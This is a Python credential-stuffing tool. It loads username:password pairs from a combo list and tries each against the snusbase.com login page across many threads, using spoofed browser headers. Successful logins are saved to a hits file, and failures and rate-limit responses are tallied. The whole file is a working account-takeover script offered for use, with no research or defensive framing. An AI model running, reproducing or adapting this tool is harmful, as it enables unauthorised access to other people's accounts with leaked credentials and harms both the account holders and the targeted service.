import requests
import threading
import queue
import time, os

from colorama import Fore

# Functions

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')
def data():
    h = open("Data/hits.txt", "r").readlines()
    b = open("Data/bad.txt", "r").readlines()
    r = open("Data/rate.txt", "r").readlines()

    return len(h), len(b), len(r)
def reset():
    with open("Data/hits.txt", "w") as f:
        pass
    with open("Data/bad.txt", "w") as f:
        pass
    with open("Data/rate.txt", "w") as f:
        pass

# Colors

blue = Fore.BLUE
green = Fore.GREEN
red = Fore.RED
yellow = Fore.YELLOW

ws = "combo.txt"

def main():
    def op_main():
        options = ["1"]
        if op in options:
            pass
        elif op == "x":
            print(yellow + "\n[*] Closing Program....")
            time.sleep(1.5)
            exit()
        else:
            print(red + "\n[!] Invalid Option")
            time.sleep(1.5)
            cls()
            main()
    cls()
    print(blue + """
                   
         _____             
        |   __|___ _ _ ___ 
        |__   |   | | |_ -|
        |_____|_|_|___|___|                   
        [1] Start Checking
        [x] Exit                     """)
    op = input(blue + "\n[>] ")
    op_main()
    cls()
    threads_ = input(blue + "Threads: ")
    print()
    reset()

    def login(combolist_queue):
        while not combolist_queue.empty():
            combo = combolist_queue.get()
            user, password = combo

            u = "https://www.snusbase.com/login"
            h = {
                "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "origin":"https://www.snusbase.com",
                "referer":"https://www.snusbase.com/login",
                "content-type":"application/x-www-form-urlencoded"
            }
            d = f"login={user}&password={password}&remember_me=on&action_login="
    
            r = requests.post(u, headers=h, data=d)
            url = "https://www.snusbase.com/dashboard"
            if r.url == url:
                acc = f"{user}:{password}"

                print(green + f"[+] {acc}")
                with open("Data/hits.txt", "a") as f:
                    f.write("[]\n")
                with open("hits.txt", "a") as f:
                    f.write(f"{acc}\n")
            
            elif r.status_code == 200:
                print(red + f"[-] {user}:{password}")
                with open("Data/bad.txt", "a") as f:
                    f.write("[]\n")

            else:
                print(yellow + "[!] Rate Limited")
                with open("Data/rate.txt", "a") as f:
                    f.write("[]\n")


    combo = open(ws, "r", encoding="utf-8").readlines()
    combolist_queue = queue.Queue()
    for i in combo:
        seq = i.strip()
        acc = seq.split(':')
        combolist_queue.put(acc)
    num_threads = int(threads_)
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=login, args=(combolist_queue,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    input(green + f"\nStopped Checking | Hits: {data()[0]} | Bad: {data()[1]} | Rate Limited: {data()[2]} | Press Enter To Close > ")

if __name__ == "__main__":
    main()